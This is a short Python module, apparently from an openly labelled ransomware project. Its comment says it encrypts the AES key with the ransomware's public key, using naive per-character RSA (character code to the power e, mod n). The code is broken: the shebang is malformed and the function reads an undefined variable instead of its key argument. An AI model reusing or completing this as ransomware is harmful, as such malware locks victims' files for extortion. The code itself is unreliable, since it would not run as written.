#!/bin/bash/env python
# coding=UTF-8
# by Tarcisio marinho
# github.com/tarcisio-marinho

# CRIPTOGRAFA A CHAVE AES COM A CHAVE PUBLICA DO RANSOMWARE

def mod(a,b):
    if(a<b):
        return a
    else:
        c=a%b
        return c

def cipher(chave_AES,n,e):
    tam=len(words)
    i=0
    lista=[]
    while(i<tam):
        letter=words[i]
        k=ord(letter)
        k=k**e
        d=mod(k,n)
        lista.append(d)
        i=i+1
    return lista
